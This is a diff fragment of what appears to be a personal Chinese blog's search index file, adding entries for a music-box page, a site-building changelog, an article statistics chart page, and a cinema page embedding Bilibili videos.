-        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临八音盒，希望舒缓的音乐能带走你一天的疲劳~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <blockquote><p>来源：网易云音乐</p></blockquote>    <div id="aplayer-csubPaob" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="12952460159" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="400px" data-preload="none" data-theme="#ad7a86"    ></div><!-- <iframe  frameborder="no" border="0"  marginwidth="0" marginheight="0"  width=530 height=310  src="//activity.kugou.com/share/v-a00a45b0/index.html?u=1045443904&h1=240987975537390846260097417101362365343&h2=483a904874cd4093b4e2381eaea94080&specialid=-2147483648&global_specialid=collection_3_1045443904_16_0&cType=0"></iframe> -->]]></content>
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网址导航</title>
+      <link href="/box/nav/index.html"/>
+      <url>/box/nav/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -2544,6 +2536,39 @@
       <url>/site/time/index.html</url>
       
         <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／关于小站的建设进程都在这里哦~!＼( ＾∀＾）</b>            </span>    <br>    <br></main><details class="folding-tag" blue>    <summary>2024.11.29</summary>    <p style="color: black;">        网站基本框架建设完毕，小站处于调试阶段！    </p></details><details class="folding-tag" blue>    <summary>2024.11.30</summary>        <p style="color: black;">1. 上传文章，并完成基本的排版！</p>        <p style="color: black;">2. 增添文章统计功能，插入文章统计图表！</p>        <p style="color: black;">3. 更改网站背景图，更换文章封面！</p></details><details class="folding-tag" blue>    <summary>2024.12.01</summary>        <p style="color: black;">1. 完成网站的评论功能！</p>        <p style="color: black;">2. 增加首页的标签冰贴</p>        <p style="color: black;">3. 更换头像以及预加载头像动画！</p></details><details class="folding-tag" blue>    <summary>2024.12.02</summary>        <p style="color: black;">1. 完善网站的一些细节，增加格言等文案</p>        <p style="color: black;">2. 进行手机适配设置，让手机用户访问网站更加舒适！</p>        <p style="color: black;">3. 增加文章的评论功能！</p></details><details class="folding-tag" blue>    <summary>2024.12.03</summary>        <p style="color: black;">1. 完成网站的网站地图功能！</p>        <p style="color: black;">2. 注册百度站长和ping站长账号，做好推送准备</p>        <p style="color: black;">3. 修改美化设置，将默认设置修改成了站长喜好！</p></details><details class="folding-tag" blue>    <summary>2024.12.04</summary>        <p style="color: black;">1. 完成网站的大部分建设</p>        <p style="color: black;">2. 增加“八音盒”功能，能从网易云音乐索引音乐播放</p>        <p style="color: black;">3. 实现全局音乐播放，在左下角固定音乐播放器，能实现背景音乐播放（但还是没有当背景音乐播放，考虑到可能会吵到读者）</p>        <p style="color: black;">4. 增加“影院”功能，牵引哔哩哔哩等链接，进行视频观看（都是站长亲自选定的）！</p>        <p style="color: black;">5. 增加根据地理位置欢迎的语句，并不断调试，最终正式上线！</p>        <p style="color: black;">6. 页脚增加标签、格言等！</p>        <p style="color: black;">7. 注册了两个域名（m3x1.cn和m3x1.fun），并实现绑定！</p>        <p>            <span style="color: blue;">至此，网站正式上线！</span>        </p></details><details class="folding-tag" blue>    <summary>2024.12.05</summary>        <p>            <span style="color: blue;">1. 网站“旧时光”功能搭建，开始记录网站建设的历程！</span>        </p>        <p style="color: black;">2. 解决打开影院功能时，视频播放器全部自动播放的问题！</p></details><details class="folding-tag" blue>    <summary>2025.01.16</summary>        <p>            <span style="color: blue;">1. 网站“恋爱小屋”功能搭建，开始记录我和女朋友的故事！</span>        </p>        <p style="color: black;">2. 优化一些细节，修复夜晚模式下看不到“网站建设”内容的问题</p>        <p style="color: black;">3. 增加“关于”页面的内容</p></details><details class="folding-tag" blue>    <summary>2025.02.04</summary>        <p style="color: black;">修复网站重大bug，修复无法显示背景和页脚汉字等问题，修复无法使用美化设置的问题。</p></details><details class="folding-tag" blue>    <summary>2025.02.05</summary>        <p style="color: black;">1.强化网站美化，增加一些推荐壁纸和文章封面图片</p>        <p style="color: black;">2.增加侧边栏新年倒计时</p></details><details class="folding-tag" blue>    <summary>2025.02.08</summary>        <p style="color: black;">优化网站代码，加快网站的运行速度，加强部署</p></details><details class="folding-tag" blue>    <summary>2025.02.09</summary>        <p style="color: black;">修改域名，增加域名</p></details><details class="folding-tag" blue>    <summary>2025.4.15</summary>        <p style="color: black;">添加友链：MilKTeA</p></details>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文章统计</title>
+      <link href="/site/echarts/index.html"/>
+      <url>/site/echarts/index.html</url>
+      
+        <content type="html"><![CDATA[<script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><!-- 文章发布时间统计图 --><div id="posts-chart" data-start="2021-01" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章标签统计图 --><div id="tags-chart" data-length="10" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章分类统计图 --><div id="categories-chart" data-parent="true" style="border-radius: 8px; height: 300px; padding: 10px;"></div>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>画廊</title>
+      <link href="/box/gallery/index.html"/>
+      <url>/box/gallery/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>影院</title>
+      <link href="/life/movies/index.html"/>
+      <url>/life/movies/index.html</url>
+      
+        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临影院，切换黑夜模式食用效果更佳哦~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <details class="folding-tag" blue>    <summary>哔哩哔哩放映厅</summary>        <div class="content">            <div class="tabs" id="room_1">                <ul class="nav-tabs">                    <li class="tab active">                        <button type="button" data-href="#room_1-1">1号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-2">2号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-3">3号厅</button>                    </li>                </ul>                <div class="tab-contents">                    <div class="tab-item-content active" id="room_1-1">                        <h3 id="您当前正处于-1-号厅，当前放映的是《冲破黑暗 Out of Darkness》">您当前正处于 1 号厅，当前放映的是《冲破黑暗 Out of Darkness》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=714997425&bvid=BV1hX4y1g7pp&cid=321134107&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-2">                        <h3 id="您当前正处于-2-号厅，当前放映的是《记忆管理局》">您当前正处于 2 号厅，当前放映的是《记忆管理局》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=884758835&bvid=BV1iK4y187Th&cid=240382860&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-3">                        <h3 id="您当前正处于-3-号厅，当前放映的是《黑盒》">您当前正处于 3 号厅，当前放映的是《黑盒》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=58854830&bvid=BV1Pt411L7Uo&cid=102606378&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    </div>                      </div>        </div></details>]]></content>
       
     </entry>
     
